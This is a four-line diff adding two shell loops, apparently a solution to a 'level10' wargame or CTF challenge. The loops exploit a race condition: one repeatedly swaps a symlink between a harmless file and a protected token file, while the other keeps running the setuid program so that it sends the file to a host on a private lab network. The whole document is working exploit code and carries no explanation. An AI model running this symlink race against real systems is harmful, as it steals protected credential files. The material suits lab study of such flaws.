@@ -1,0 +1,4 @@
+
+while true; do ./level10 /tmp/fake 192.168.56.101;  done
+
+while true; do ln -sf /tmp/test /tmp/fake; ln -sf /home/user/level10/token /tmp/fake; done
